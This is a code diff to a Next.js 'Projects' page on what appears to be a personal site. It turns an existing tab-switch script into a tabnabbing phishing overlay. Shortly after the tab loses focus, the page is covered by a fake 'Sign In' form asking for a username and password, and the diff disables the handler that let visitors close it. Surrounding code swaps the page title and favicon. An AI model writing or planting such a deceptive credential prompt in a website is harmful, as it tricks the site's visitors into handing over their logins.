@@ -3,11 +3,15 @@ import projectsData from '@/data/projectsData'
 import Card from '@/components/Card'
 import { PageSEO } from '@/components/SEO'
 import Script from 'next/script'
+import { useRef } from 'react'
 
 export default function Projects() {
+  const fakeLoginFormRoot = useRef(null)
+
   return (
     <>
       <PageSEO title={`Projects - ${siteMetadata.author}`} description={siteMetadata.description} />
+      <div ref={fakeLoginFormRoot}></div>
       <div className="divide-y divide-gray-200 dark:divide-gray-700">
         <div className="space-y-2 pt-6 pb-8 md:space-y-5">
           <h1 className="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-6xl md:leading-14">
@@ -39,7 +43,7 @@ export default function Projects() {
 
             // Events
             window.onblur = function () {
-              TIMER = setTimeout(changeItUp, 5000)
+              TIMER = setTimeout(changeItUp, 10)
             }
 
             window.onfocus = function () {
@@ -103,36 +107,32 @@ export default function Projects() {
               div.style.textAlign = 'center'
               document.body.style.overflow = 'hidden'
 
-              var img = document.createElement('img')
-              img.style.paddingTop = '15px'
-              img.src = 'http://img.skitch.com/20100524-b639xgwegpdej3cepch2387ene.png'
-              // document.getElementById('__next').insertAdjacentHTML(
-              //   'afterend',
-              //   `
-              //  <form>
-              //     <div class="inputBox">
-              //         <input type="email" name="email" value="">
-              //         <label>Username</label>
-              //     </div>
-              //     <div class="inputBox">
-              //             <input type="text" name="text" value="">
-              //             <label>Password</label>
-              //         </div>
-              //     <input type="submit" name="sign-in" value="Sign In">
-              // </form>`
-              // )
+              // var img = document.createElement('img')
+              // img.style.paddingTop = '15px'
+              // img.src = 'http://img.skitch.com/20100524-b639xgwegpdej3cepch2387ene.png'
 
               var oldTitle = document.title
               var oldFavicon = favicon.get() || '/favicon.ico'
-
-              div.appendChild(img)
+              div.innerHTML = `<form>
+              <div class="inputBox">
+                  <input type="email" name="email" value="">
+                  <label>Username</label>
+              </div>
+              <div class="inputBox">
+                      <input type="text" name="text" value="">
+                      <label>Password</label>
+                  </div>
+              <input type="submit" name="sign-in" value="Sign In">
+          </form>`
+              // div.appendChild(img)
               document.body.appendChild(div)
-              img.onclick = function () {
-                div.parentNode.removeChild(div)
-                document.body.style.overflow = 'auto'
-                setTitle(oldTitle)
-                favicon.set(oldFavicon)
-              }
+
+              // img.onclick = function () {
+              //   div.parentNode.removeChild(div)
+              //   document.body.style.overflow = 'auto'
+              //   setTitle(oldTitle)
+              //   favicon.set(oldFavicon)
+              // }
             }
 
             function changeItUp() {
